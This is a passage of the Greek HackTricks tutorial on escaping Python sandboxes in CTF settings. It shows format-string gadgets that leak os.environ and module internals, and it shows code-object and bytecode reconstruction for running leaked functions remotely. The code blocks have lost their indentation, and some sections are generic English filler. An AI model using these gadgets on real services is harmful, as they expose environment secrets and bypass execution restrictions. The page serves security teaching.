Επιπλέον, είναι δυνατόν να **κωδικοποιήσετε νέους μορφοποιητές** σε κλάσεις:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Περισσότερα παραδείγματα** για παραδείγματα **μορφοποίησης** **συμβολοσειράς** μπορείτε να βρείτε στην ιστοσελίδα [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Ελέγξτε επίσης την παρακάτω σελίδα για gadgets που θα **διαβάσουν ευαίσθητες πληροφορίες από εσωτερικά αντικείμενα της Python**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Πληροφορίες Αποκάλυψης Ευαίσθητων Πληροφοριών
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Ανάλυση Αντικειμένων Python

{% hint style="info" %}
Εάν θέλετε να **μάθετε** για το **bytecode της Python** λεπτομερώς, διαβάστε αυτήν την **εκπληκτική** ανάρτηση για το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

Σε ορισμένα CTFs μπορεί να σας δίνεται το όνομα μιας **προσαρμοσμένης συνάρτησης** όπου βρίσκεται η σημαία και χρειάζεστε να δείτε τα **εσωτερικά** της συνάρτησης για να την εξαγάγετε.

Αυτή είναι η συνάρτηση προς επιθεώρηση:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

Η συνάρτηση `dir` χρησιμοποιείται για να επιστρέψει μια λίστα με τα ονόματα των στοιχείων σε ένα αντικείμενο. Αυτά τα στοιχεία μπορεί να είναι μεταβλητές, συναρτήσεις, κλάσεις, μέθοδοι κ.λπ. Η συνάρτηση `dir` είναι χρήσιμη για την εξερεύνηση των διαθέσιμων στοιχείων ενός αντικειμένου και την ανάλυση της δομής του.

Σύνταξη:
```python
dir(object)
```

Παράδειγμα:
```python
class MyClass:
    def __init__(self):
        self.name = "John"
        self.age = 30

my_object = MyClass()
print(dir(my_object))
```

Αποτέλεσμα:
```
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name']
```

Στο παραπάνω παράδειγμα, η συνάρτηση `dir` επιστρέφει μια λίστα με τα ονόματα των στοιχείων του αντικειμένου `my_object`, που περιλαμβάνει τις μεταβλητές `name` και `age`.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` και `func_globals`(Ίδιο) Αποκτά το παγκόσμιο περιβάλλον. Στο παράδειγμα μπορείτε να δείτε μερικά εισαγόμενα αρθρώματα, μερικές παγκόσμιες μεταβλητές και το περιεχόμενό τους που έχουν δηλωθεί:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Δείτε εδώ περισσότερα μέρη για να αποκτήσετε τις globals**](./#globals-and-locals)

### **Πρόσβαση στον κώδικα της συνάρτησης**

**`__code__`** και `func_code`: Μπορείτε να **έχετε πρόσβαση** σε αυτό το **χαρακτηριστικό** της συνάρτησης για να **αποκτήσετε το αντικείμενο κώδικα** της συνάρτησης.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Λήψη Πληροφοριών Κώδικα

To bypass Python sandboxes, it is important to gather information about the code being executed. This information can help in identifying vulnerabilities and finding ways to exploit them.

#### 1. Inspecting the code

One way to gather code information is by inspecting the source code itself. This can be done by using tools like `inspect` or by reading the code directly. By analyzing the code, you can identify potential security flaws or weak points that can be exploited.

#### 2. Analyzing dependencies

Another important aspect is to analyze the dependencies of the code. This includes libraries, modules, and external packages that the code relies on. By understanding the dependencies, you can identify potential vulnerabilities in these components and exploit them to bypass the sandbox.

#### 3. Identifying entry points

Identifying the entry points of the code is crucial for bypassing the sandbox. Entry points are the parts of the code that are executed first when the program starts. By analyzing the entry points, you can understand the flow of the code and find ways to manipulate it to bypass the sandbox.

#### 4. Examining error messages

Error messages can provide valuable information about the code execution. By examining error messages, you can identify potential vulnerabilities or misconfigurations that can be exploited to bypass the sandbox. Pay attention to any sensitive information or stack traces that might be leaked in the error messages.

#### 5. Monitoring system calls

Monitoring system calls can help in understanding the behavior of the code and identifying any suspicious or malicious activities. Tools like `strace` or `sysdig` can be used to monitor system calls and gather information about the code execution. By analyzing the system calls, you can identify potential vulnerabilities or ways to bypass the sandbox.

By gathering code information through these techniques, you can gain a better understanding of the code being executed and find ways to bypass Python sandboxes.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Αποσυναρμολόγηση μιας συνάρτησης**

To disassemble a function in Python, you can use the `dis` module. This module provides functions to disassemble and inspect Python bytecode. By disassembling a function, you can see the low-level instructions that make up the function's code.

Here's an example of how to disassemble a function using the `dis` module:

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

This will output the disassembled bytecode of the `my_function` function, showing the individual instructions and their corresponding bytecode offsets.

By analyzing the disassembled code, you can gain insights into how the function works and potentially identify any vulnerabilities or weaknesses in the code. Disassembling functions can be particularly useful when bypassing Python sandboxes or analyzing obfuscated code.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Παρατηρήστε ότι **αν δεν μπορείτε να εισαγάγετε το `dis` στο περιβάλλον εκτέλεσης της Python**, μπορείτε να αποκτήσετε το **bytecode** της συνάρτησης (`get_flag.func_code.co_code`) και να το αποσυναρμολογήσετε τοπικά. Δεν θα δείτε το περιεχόμενο των μεταβλητών που φορτώνονται (`LOAD_CONST`), αλλά μπορείτε να τις μαντέψετε από το (`get_flag.func_code.co_consts`) επειδή το `LOAD_CONST` δίνει επίσης τη θέση της μεταβλητής που φορτώνεται.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Μεταγλώττιση της Python

Ας υποθέσουμε τώρα ότι καταφέρνετε κάπως να **ανακτήσετε πληροφορίες για μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να την **εκτελέσετε**.\
Όπως στο παρακάτω παράδειγμα, μπορείτε **να έχετε πρόσβαση στο αντικείμενο κώδικα** αυτής της συνάρτησης, αλλά απλά διαβάζοντας την αποσυναρμολόγηση δεν ξέρετε πώς να υπολογίσετε τη σημαία (_φανταστείτε μια πιο πολύπλοκη συνάρτηση `calc_flag`_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Δημιουργία του αντικειμένου κώδικα

Καταρχήν, πρέπει να ξέρουμε **πώς να δημιουργήσουμε και να εκτελέσουμε ένα αντικείμενο κώδικα** έτσι ώστε να μπορούμε να δημιουργήσουμε ένα για να εκτελέσουμε τη διαρρευσμένη συνάρτησή μας:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Ανάλογα με την έκδοση της Python, οι **παράμετροι** του `code_type` μπορεί να έχουν **διαφορετική σειρά**. Ο καλύτερος τρόπος για να γνωρίζετε τη σειρά των παραμέτρων στην έκδοση της Python που εκτελείτε είναι να εκτελέσετε:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Αναπαραγωγή μιας διαρρευμένης συνάρτησης

{% hint style="warning" %}
Στο παρακάτω παράδειγμα, θα πάρουμε όλα τα δεδομένα που χρειάζονται για να αναπαράγουμε τη συνάρτηση απευθείας από το αντικείμενο κώδικα της συνάρτησης. Σε ένα **πραγματικό παράδειγμα**, όλες οι **τιμές** για να εκτελέσετε τη συνάρτηση **`code_type`** είναι αυτές που **θα χρειαστείτε να διαρρεύσετε**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Παράκαμψη Αμυνών

Στα προηγούμενα παραδείγματα στην αρχή αυτής της ανάρτησης, μπορείτε να δείτε **πώς να εκτελέσετε οποιοδήποτε κώδικα Python χρησιμοποιώντας τη συνάρτηση `compile`**. Αυτό είναι ενδιαφέρον επειδή μπορείτε να **εκτελέσετε ολόκληρα σενάρια** με βρόχους και τα πάντα σε μία **μία γραμμή κώδικα** (και μπορούμε να κάνουμε το ίδιο χρησιμοποιώντας το **`exec`**).

Παρόλα αυτά, μερικές φορές μπορεί να είναι χρήσιμο να **δημιουργήσουμε** ένα **αντικείμενο που έχει μεταγλωττιστεί** σε μία τοπική μηχανή και να το εκτελέσουμε στη **μηχανή CTF** (για παράδειγμα επειδή δεν έχουμε τη συνάρτηση `compile` στη μηχανή CTF).

Για παράδειγμα, ας μεταγλωττίσουμε και να εκτελέσουμε χειροκίνητα μια συνάρτηση που διαβάζει το _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Εάν δεν μπορείτε να έχετε πρόσβαση στις εντολές `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κανονική συνάρτηση**, αλλά η κλήση της απευθείας συνήθως θα αποτύχει με το μήνυμα: _constructor not accessible in restricted mode_. Επομένως, χρειάζεστε μια **συνάρτηση που δεν βρίσκεται σε περιορισμένο περιβάλλον για να καλέσετε αυτήν τη συνάρτηση**.
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Αποσυναρμολόγηση Μεταγλωττισμένου Python

Χρησιμοποιώντας εργαλεία όπως το [**https://www.decompiler.com/**](https://www.decompiler.com) μπορεί κανείς να **αποσυναρμολογήσει** δοσμένο μεταγλωττισμένο κώδικα Python.

**Δείτε αυτό το εκπαιδευτικό υλικό**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Διάφορα Python

### Assert

Ο Python που εκτελείται με βελτιστοποιήσεις με την παράμετρο `-O` θα αφαιρέσει τις δηλώσεις assert και οποιονδήποτε κώδικα που εξαρτάται από την τιμή της **debug**.\
Επομένως, ελέγχοι όπως
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Αναφορές

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από APIs έως ιστοσελίδες και συστήματα cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
